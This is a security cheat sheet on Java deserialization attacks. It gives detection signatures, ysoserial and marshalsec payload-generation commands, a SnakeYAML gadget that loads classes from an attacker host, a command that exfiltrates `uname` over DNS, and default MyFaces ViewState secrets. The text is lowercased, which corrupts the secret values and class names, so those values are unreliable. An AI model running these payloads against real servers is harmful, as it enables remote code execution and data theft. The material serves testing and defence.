# java deserialization

> java serialization is the process of converting a java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. serialization in java is primarily done using the `serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between jvms.


## summary

* [detection](#detection)
* [tools](#tools)
    * [ysoserial](#ysoserial)
    * [burp extensions using ysoserial](#burp-extensionsl)
    * [alternative tooling](#alternative-tooling)
* [yaml deserialization](#yaml-deserialization)
* [viewstate](#viewstate)
* [references](#references)


## detection

- `"ac ed 00 05"` in hex
    * `ac ed`: stream_magic. specifies that this is a serialization protocol.
    * `00 05`: stream_version. the serialization version.
- `"ro0"` in base64
- `content-type` = "application/x-java-serialized-object"
- `"h4siaaaaaaaaaj"` in gzip(base64)


## tools

### ysoserial

[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : a proof-of-concept tool for generating payloads that exploit unsafe java object deserialization.

```java
java -jar ysoserial.jar commonscollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

**list of payloads included in ysoserial:**

| payload             | authors                                | dependencies |
| ------------------- | -------------------------------------- | --- |
| aspectjweaver       | @jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |
| beanshell1          | @pwntester, @cschneider4711            | bsh:2.0b5 |
| c3p0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
| click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
| clojure             | @jackofmosttrades                      | clojure:1.8.0 |
| commonsbeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
| commonscollections1 | @frohoff                               | commons-collections:3.1 |
| commonscollections2 | @frohoff                               | commons-collections4:4.0 |
| commonscollections3 | @frohoff                               | commons-collections:3.1 | 
| commonscollections4 | @frohoff                               | commons-collections4:4.0 |
| commonscollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1  |
| commonscollections6 | @matthias_kaiser                       | commons-collections:3.1  |
| commonscollections7 | @scristalli, @hanyrax, @edoardovignati | commons-collections:3.1  |
| fileupload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4|
| groovy1             | @frohoff                               | groovy:2.3.9            |
| hibernate1          | @mbechler                              | |
| hibernate2          | @mbechler                              | |
| jbossinterceptors1  | @matthias_kaiser                       | javassist:3.12.1.ga, jboss-interceptor-core:2.0.0.final, cdi-api:1.0-sp1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.final, slf4j-api:1.7.21 |
| jrmpclient          | @mbechler                              | |
| jrmplistener        | @mbechler                              | |
| json1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.release, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.release, commons-collections:3.1 |
| javassistweld1      | @matthias_kaiser                       | javassist:3.12.1.ga, weld-core:1.1.33.final, cdi-api:1.0-sp1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.final, slf4j-api:1.7.21 |
| jdk7u21             | @frohoff                               | |
| jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2 |
| mozillarhino1       | @matthias_kaiser                       | js:1.7r2 |
| mozillarhino2       | @_tint0                                | js:1.7r2 |
| myfaces1            | @mbechler                              | |
| myfaces2            | @mbechler                              | |
| rome                | @mbechler                              | rome:1.0 |
| spring1             | @frohoff                               | spring-core:4.1.4.release, spring-beans:4.1.4.release |
| spring2             | @mbechler                              | spring-core:4.1.4.release, spring-aop:4.1.4.release, aopalliance:1.0, commons-logging:1.2 |
| urldns              | @gebl                                  | |
| vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
| wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |


### burp extensions

- [netspi/javaserialkiller](https://github.com/netspi/javaserialkiller) -  burp extension to perform java deserialization attacks 
- [federicodotta/java deserialization scanner](https://github.com/federicodotta/java-deserialization-scanner) -  all-in-one plugin for burp suite for the detection and the exploitation of java deserialization vulnerabilities 
- [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  ysoserial integration with burp suite 
- [directdefense/superserial](https://github.com/directdefense/superserial) - burp java deserialization vulnerability identification
- [directdefense/superserial-active](https://github.com/directdefense/superserial-active) - java deserialization vulnerability active identification burp extender


### alternative tooling

- [pwntester/jre8u20_rce_gadget](https://github.com/pwntester/jre8u20_rce_gadget) - pure jre 8 rce deserialization gadget
- [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - jboss (and others java deserialization vulnerabilities) verify and exploitation tool
- [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - a fork of the original ysoserial application 
- [nickstadb/serialbrute](https://github.com/nickstadb/serialbrute) - java serialization brute force attack tool
- [nickstadb/serializationdumper](https://github.com/nickstadb/serializationdumper) - a tool to dump java serialization streams in a more human readable form
- [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - exploiting deserialization to brute-force the remote classpath
- [k3idii/deserek](https://github.com/k3idii/deserek) - python code to serialize and unserialize java binary serialization format. 
  ```java
  java -jar ysoserial.jar urldns http://xx.yy > yss_base.bin
  python deserek.py yss_base.bin --format python > yss_url.py
  python yss_url.py yss_new.bin
  java -cp javaserializationtestsuite deserial yss_new.bin
  ```
- [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - java unmarshaller security - turning your data into code execution
  ```java
  $ java -cp marshalsec.jar marshalsec.<marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
  $ java -cp marshalsec.jar marshalsec.jsonio groovy "cmd" "/c" "calc"
  $ java -cp marshalsec.jar marshalsec.jndi.ldaprefserver http://localhost:8000\#exploit.jndiexploit 1389
  // -a - generates/tests all payloads for that marshaller
  // -t - runs in test mode, unmarshalling the generated payloads after generating them.
  // -v - verbose mode, e.g. also shows the generated payload in test mode.
  // gadget_type - identifier of a specific gadget, if left out will display the available ones for that specific marshaller.
  // arguments - gadget specific arguments
  ```

payload generators for the following marshallers are included:

| marshaller                      | gadget impact                                |
| ------------------------------- | ---------------------------------------------- |
| blazedsamf(0&#124;3&#124;x)     | jdk only escalation to java serialization various third party libraries rces |
| hessian&#124;burlap             | various third party rces |
| castor                          | dependency library rce |
| jackson                         | **possible jdk only rce**, various third party rces |
| java                            | yet another third party rce |
| jsonio                          | **jdk only rce** |
| jyaml                           | **jdk only rce** |
| kryo                            | third party rces |
| kryoaltstrategy                 | **jdk only rce** |
| red5amf(0&#124;3)               | **jdk only rce** |
| snakeyaml                       | **jdk only rces** |
| xstream                         | **jdk only rces** |
| yamlbeans                       | third party rce |



## yaml deserialization

snakeyaml is a popular java-based library used for parsing and emitting yaml (yaml ain't markup language) data. it provides an easy-to-use api for working with yaml, a human-readable data serialization standard commonly used for configuration files and data exchange.

```yaml
!!javax.script.scriptenginemanager [
  !!java.net.urlclassloader [[
    !!java.net.url ["http://attacker-ip/"]
  ]]
]
```


## viewstate

in java, viewstate refers to the mechanism used by frameworks like javaserver faces (jsf) to maintain the state of ui components between http requests in web applications. there are 2 major implementations:

* oracle mojarra (jsf reference implementation)
* apache myfaces

**tools**:

* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - jexboss: jboss (and java deserialization vulnerabilities) verify and exploitation tool
* [synacktiv-contrib/inyourface](https://github.com/synacktiv-contrib/inyourface) - inyourface is a software used to patch unencrypted and unsigned jsf viewstates.


### encoding

| encoding      | starts with |
| ------------- | ----------- |
| base64        | `ro0`       |
| base64 + gzip | `h4siaaa`   |


### storage

the `javax.faces.state_saving_method` is a configuration parameter in javaserver faces (jsf). it specifies how the framework should save the state of a component tree (the structure and data of ui components on a page) between http requests.

the storage method can also be inferred from the viewstate representation in the html body.

* **server side** storage: `value="-xxx:-xxxx"`
* **client side** storage: `base64 + gzip + java object`


### encryption

by default myfaces uses des as encryption algorithm and hmac-sha1 to authenticate the viewstate. it is possible and recommended to configure more recent algorithms like aes and hmac-sha256.

| encryption algorithm | hmac        |
| -------------------- | ----------- |
| des ecb (default)    | hmac-sha1   |

supported encryption methods are blowfish, 3des, aes and are defined by a context parameter.
the value of these parameters and their secrets can be found inside these xml clauses.

```xml
<param-name>org.apache.myfaces.mac_algorithm</param-name>   
<param-name>org.apache.myfaces.secret</param-name>   
<param-name>org.apache.myfaces.mac_secret</param-name>
```

common secrets from the [documentation](https://cwiki.apache.org/confluence/display/myfaces2/secure+your+application).

| name                 | value                              |
| -------------------- | ---------------------------------- |
| aes cbc/pkcs5padding | `nzy1ndmymta3nju0mzixma==`         |
| des                  | `nzy1ndmymta=<`                    |
| desede               | `mdeymzq1njc4otaxmjm0nty3odkwmtiz` |
| blowfish             | `nzy1ndmymta3nju0mzixma`           |
| aes cbc              | `mdeymzq1njc4otaxmjm0nty3odkwmtiz` |
| aes cbc iv           | `nzy1ndmymta3nju0mzixma==`         |


* **encryption**: data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> viewstate
* **decryption**: viewstate -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> data


## references

- [detecting deserialization bugs with dns exfiltration - philippe arteau - march 22, 2017](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
- [hack the box - arkham - 0xrick - august 10, 2019](https://0xrick.github.io/hack-the-box/arkham/)
- [how i found a $1500 worth deserialization vulnerability - ashish kunwar - august 28, 2018](https://medium.com/@d0rkerdevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
- [jackson cve-2019-12384: anatomy of a vulnerability class - andrea brancaleoni - july 22, 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [java deserialization in viewstate - haboob team - december 23, 2020](https://www.exploit-db.com/docs/48126)
- [java-deserialization-cheat-sheet - aleksei tiurin - may 23, 2023](https://github.com/grrrdog/java-deserialization-cheat-sheet/blob/master/readme.md)
- [jsf viewstate upside-down - renaud dubourguais, nicolas collignon - march 15, 2016](https://www.synacktiv.com/ressources/jsf_viewstate_inyourface.pdf)
- [misconfigured jsf viewstates can lead to severe rce vulnerabilities - peter stöckli - august 14, 2017](https://www.alphabot.com/security/blog/2017/java/misconfigured-jsf-viewstates-can-lead-to-severe-rce-vulnerabilities.html)
- [misconfigured jsf viewstates can lead to severe rce vulnerabilities - peter stöckli - august 14, 2017](https://www.alphabot.com/security/blog/2017/java/misconfigured-jsf-viewstates-can-lead-to-severe-rce-vulnerabilities.html)
- [on jackson cves: don’t panic — here is what you need to know - cowtowncoder - december 22, 2017](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
- [pre-auth rce in forgerock openam (cve-2021-35464) - michael stepankin (@artsploit) - june 29, 2021](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
- [triggering a dns lookup using java deserialization - paranoidsoftware.com - july 5, 2020](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
- [understanding & practicing java deserialization exploits - diablohorn - september 9, 2017](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)